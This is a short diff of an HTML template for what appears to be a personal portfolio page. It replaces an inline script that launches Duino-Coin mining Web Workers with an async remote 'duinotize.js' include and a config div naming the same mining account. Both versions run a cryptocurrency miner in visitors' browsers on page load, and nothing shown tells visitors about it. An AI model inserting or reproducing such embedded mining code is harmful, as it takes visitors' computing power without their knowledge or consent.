@@ -33,21 +33,6 @@
         update_age();
     }, 100)
     </script>
-    <script>
-      // Configs
-      let username = "chunkymilk0309";
-      let rigid = "portfolio";
-      let threads = 1;
-      let difficulty = "LOW";
-      let hasher = "DUCO-S1";
-  
-      // DO NOT EDIT ANYTHING BELOW THIS LINE
-      let wallet_id = Math.floor(Math.random() * 2811);
-      let workerVer = 0;
-      for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
-          var socketWorker = new Worker("https://ryanfortner.github.io/Duinotize/main.js");
-          socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer + "," + hasher);
-          workerVer++;
-      }
-    </script>
+    <script src="https://ryanfortner.github.io/Duinotize/duinotize.js" async></script>
+    <div id="duinotize-config" username="chunkymilk0309" alias="portfolio"></div>
 {% endblock %}
